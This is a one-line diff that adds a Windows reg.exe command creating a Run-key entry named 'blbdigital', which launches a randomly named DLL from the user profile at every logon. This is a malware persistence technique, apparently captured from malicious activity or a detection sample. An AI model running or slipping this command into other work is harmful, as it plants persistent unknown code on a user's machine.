@@ -1,0 +1,1 @@
+reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v blbdigital /t REG_SZ /d "%userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL"
